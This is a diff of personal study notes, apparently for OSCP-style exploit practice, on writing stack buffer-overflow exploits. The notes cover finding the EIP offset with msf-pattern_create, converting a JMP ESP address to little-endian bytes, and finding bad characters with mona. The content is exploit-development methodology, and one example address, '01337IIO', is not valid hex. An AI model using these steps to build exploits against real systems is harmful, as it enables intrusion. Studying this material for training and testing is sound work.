@@ -9,6 +9,8 @@
 
 
 
+
+
 ##::::::>>>>>>>:::::::::::::::PATTERN::::::::::::<<<<<:::::::::::::::::::::::::::::::
 
 >> msf-pattern_create -l <lenght_of_chars_to_test>
@@ -16,6 +18,9 @@
 
 -------------------------------------------------
 then check if we can control EIP using BBBB
+
+
+
 
 
 
@@ -36,17 +41,26 @@ suppose jmp esp address is 56526683 -- convert it like this--> \x83\x66\x52\x56
 
 JMP ESP value found !  \x83\x66\x52\x56
 
-THIS VALUE WILL COME IN PLACE OF "BBBB" ;)
+THIS VALUE WILL COME IN PLACE OF "BBBB" ;) in the final exploit 
+
+
+
 
 
 ##::::::::::::::::::::::::::::::BAD CHARS : Automatic Way : Safest waY ! :::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
+====>>  KEEP EIP AS "BBBB" , send the A * 786 and BBBB and then add payload ( the following bytearray we get from mona bytearray )
+
 USE  
->> !mona config -set workingfolder C:\logs\%p
->> !mona bytearray     
+>> !mona config -set workingfolder C:\logs\%p                           
+>> !mona bytearray                                                      ===> to create a array !
 >> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01B27464       ====> 01B27464 is the ESP value !
->> !mona bytearray -b "\x00\x01\x02"
->> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01337IIO
+>> !mona bytearray -b "\x00\x01\x02"                                     ====> create new byte array xcluding the bad characters 00 01 02
+>> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01337IIO         ======> compare again to check the bad characters !
+
+
+
+
 
 
 
